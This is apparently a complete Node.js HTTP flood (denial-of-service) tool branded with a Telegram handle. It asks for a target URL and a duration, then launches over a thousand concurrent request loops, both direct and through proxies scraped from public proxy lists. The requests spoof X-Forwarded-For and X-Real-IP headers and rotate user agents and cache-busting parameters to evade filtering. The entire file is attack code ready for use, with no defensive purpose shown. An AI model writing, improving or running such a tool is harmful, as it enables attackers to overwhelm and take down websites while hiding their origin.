const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const process = require('process');
const HttpsProxyAgent = require('https-proxy-agent');

const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540);
const REQUEST_TIMEOUT = 8000;
const PROXY_FETCH_DELAY = 10000;

function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
    } catch {
        return [];
    }
}

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');

const UA_POOL = Array.from({ length: 10000 }, () =>
    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0'
);

const keepAliveHttp = new http.Agent({ keepAlive: true });
const keepAliveHttps = new https.Agent({ keepAlive: true });

let PROXIES = [];

async function fetchProxies() {
    const urls = [
        'https://sts-proxies.vercel.app/v2/',
        'https://www.proxy-list.download/api/v1/get?type=http',
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
    ];

    const fileProxies = [...loadLines('proxies.txt'), ...loadLines('proxy2.txt')];
    const allProxies = [...fileProxies];

    const fetchTasks = urls.map(url =>
        axios.get(url, { timeout: REQUEST_TIMEOUT }).then(res => {
            const list = res.data.split('\n').map(p => p.trim()).filter(Boolean);
            allProxies.push(...list);
        }).catch(() => { })
    );

    await Promise.all(fetchTasks);
    await new Promise(res => setTimeout(res, PROXY_FETCH_DELAY));

    const unique = [...new Set(allProxies)];
    console.log(`Loaded ${unique.length} proxies`);
    return unique;
}

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = {
            total: 0,
            success: 0,
            errors: 0,
            peakRps: 0
        };
        this.uaIndex = 0;
        this.running = true;
        this.proxyIndex = 0;
        this.workingProxies = [];
    }

    getRandomUA() {
        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
        return UA_POOL[this.uaIndex];
    }

    getRandomReferer() {
        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
    }

    getNextProxy() {
        if (PROXIES.length === 0) return null;
        this.proxyIndex = (this.proxyIndex + 1) % PROXIES.length;
        return PROXIES[this.proxyIndex];
    }

    async makeRequest(useProxy = false) {
        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
        const headers = {
            'User-Agent': this.getRandomUA(),
            'Referer': this.getRandomReferer(),
            'X-Forwarded-For': randomIP,
            'X-Real-IP': randomIP,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        };

        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
        const config = {
            headers,
            timeout: REQUEST_TIMEOUT,
            httpAgent: keepAliveHttp,
            httpsAgent: keepAliveHttps,
            validateStatus: null
        };

        if (useProxy) {
            const proxy = this.getNextProxy();
            if (!proxy) return;

            config.proxy = false;
            config.httpsAgent = new HttpsProxyAgent(`http://${proxy}`);
            config.httpAgent = new HttpsProxyAgent(`http://${proxy}`);
        }

        try {
            const response = await axios.get(urlWithNoise, config);
            if (response.status === 200) {
                this.stats.success++;
                if (useProxy && !this.workingProxies.includes(config.httpsAgent.proxy.host)) {
                    this.workingProxies.push(config.httpsAgent.proxy.host);
                }
                return;
            }
        } catch { }

        this.stats.errors++;
    }

    async startWorkers() {
        const workers = [];

        for (let i = 0; i < MAX_CONCURRENT; i++) {
            workers.push(this.workerLoop());
        }

        await Promise.all(workers);
    }

    async workerLoop() {
        while (this.running && Date.now() - this.startTime < this.duration) {
            this.stats.total++;
            await Promise.all([
                this.makeRequest(false),
                this.makeRequest(true)
            ]);
        }
    }

    async runAttack() {
        console.clear();
        console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
        console.log('  ============================================');
        console.log(`  TARGET: ${this.target}`);
        console.log(`  TIME:   ${this.duration / 1000}s`);
        console.log(`  MODE:   DUAL STRIKE - ${MAX_CONCURRENT}x2 Concurrent`);
        console.log('  ============================================\n');

        let lastTotal = 0;
        const printStats = setInterval(() => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const currentRps = (this.stats.total - lastTotal) / 0.2;
            lastTotal = this.stats.total;
            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);

            process.stdout.write(
                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
            );
        }, 200);

        await this.startWorkers();
        this.running = false;
        clearInterval(printStats);
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = this.stats.total / elapsed;
        console.log('\n\n  ATTACK FINISHED');
        console.log('  ============================================');
        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
        console.log(`  TOTAL:       ${this.stats.total}`);
        console.log(`  SUCCESS:     ${this.stats.success}`);
        console.log(`  ERRORS:      ${this.stats.errors}`);
        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
        console.log(`  WORKING PROXIES: ${this.workingProxies.length}`);
        console.log('  ============================================\n');
    }
}

// Main
(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("TIME: ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    PROXIES = await fetchProxies();

    const engine = new AttackEngine(target, duration);
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("Attack failed:", err.message);
    }
})();
